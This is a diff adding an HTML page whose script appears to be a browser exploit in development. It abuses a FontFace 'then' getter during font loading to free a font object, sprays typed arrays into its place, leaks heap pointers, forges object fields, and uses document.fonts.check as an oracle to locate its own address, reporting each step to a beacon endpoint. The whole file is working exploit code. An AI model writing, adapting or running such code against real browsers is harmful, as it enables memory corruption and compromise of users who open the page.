@@ -1,0 +1,118 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p818 min</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">v14 &middot; 1K &middot; min &middot; b0=48</div>
+<pre id="out">p818v8</pre>
+<script>
+'use strict';
+var SKIPJ=-1,O=document.getElementById('out'),UID=Math.random().toString(36).slice(2,8).toUpperCase();
+function b(m){try{O.textContent+='\n'+m;}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P817-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m);}catch(e2){}}}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+
+var K=qint('k',8), PW=qint('pw',60);
+var SIZE=192, fired=false, faces=null;
+
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);if(L1===0n){L1=a;L2=c;}}
+  }
+  b('L1-'+hex(L1));b('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK — click again');return;}
+
+  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
+  b('FORGED-'+bufs.length);
+
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      setTimeout(function(){
+        var fam=null;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN — click again');return;}
+        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}
+
+        var self=0n,selfFound=false;
+        var b0v=[0x48];
+        var B1STEP=64, b2hi=255, n3=0, maxCheck=1500;
+        var chkS='1em '+fam;
+        var chkC0=String.fromCodePoint(0x1000),chkC1=String.fromCodePoint(0xFFF),chkC2=String.fromCodePoint(0x2000),chkC3=String.fromCodePoint(0x2001);
+        function chk2(cc){try{return document.fonts.check(chkS,cc)===false;}catch(e){return null;}}
+        function setRB(b0,b1,b2){
+          var lo0=b0+0x38,c0=(lo0>0xFF)?1:0;lo0&=0xFF;
+          var lo1=b1+c0,c1=(lo1>0xFF)?1:0;lo1&=0xFF;
+          var lo2=b2+c1,c2=(lo2>0xFF)?1:0;lo2&=0xFF;
+          for(var ir=0;ir<bufs.length;ir++){
+            if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;
+            bufs[ir][0][0x20]=lo0;bufs[ir][0][0x21]=lo1;bufs[ir][0][0x22]=lo2;bufs[ir][0][0x23]=c2;
+            bufs[ir][0][0x24]=0x10;bufs[ir][0][0x25]=0;bufs[ir][0][0x26]=0;bufs[ir][0][0x27]=0;
+          }
+        }
+        b('SELF-SCAN-b0=['+b0v+']-b1step='+B1STEP+'-max='+maxCheck);
+        var sqB2=0,sqB1=0,sqB0=0;
+        function scanStep(){
+          var lim=n3+128;
+          while(n3<lim){
+            if(sqB2>b2hi){bs('NOSELF-n3='+n3);verd('bad','NOSELF — click again');return;}
+            setRB(b0v[sqB0],sqB1,sqB2);n3++;
+            if(chk2(chkC0)===true){
+              n3+=3;
+              if(chk2(chkC1)===false&&chk2(chkC2)===true&&chk2(chkC3)===false){
+                var lo0=(b0v[sqB0]+0x38),c0=(lo0>255)?1:0;lo0&=255;
+                var lo1=(sqB1+c0),c1=(lo1>255)?1:0;lo1&=255;
+                var lo2=(sqB2+c1);lo2&=255;
+                self=BigInt(lo0)|(BigInt(lo1)<<8n)|(BigInt(lo2)<<16n)|0x1000000000n;
+                selfFound=true;
+                bs('SELF-'+hex(self)+'-n3='+n3);afterSelf();return;
+              }
+            }
+            sqB0++;if(sqB0>=b0v.length){sqB0=0;sqB1+=B1STEP;if(sqB1>=256){sqB1=0;sqB2++;}}
+          }
+          if(n3>maxCheck){b('BAIL-n3='+n3);verd('bad','BAIL — over '+maxCheck);return;}
+          if(n3%4096<128)b('PROG-n3='+n3+'-b2='+sqB2);
+          setTimeout(scanStep,0);
+        }
+        function afterSelf(){bs('SELF-DONE-'+hex(self));verd('ok','SELF='+hex(self)+' — load walk page');}
+        scanStep();
+      },40);
+    },30);
+  },40);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
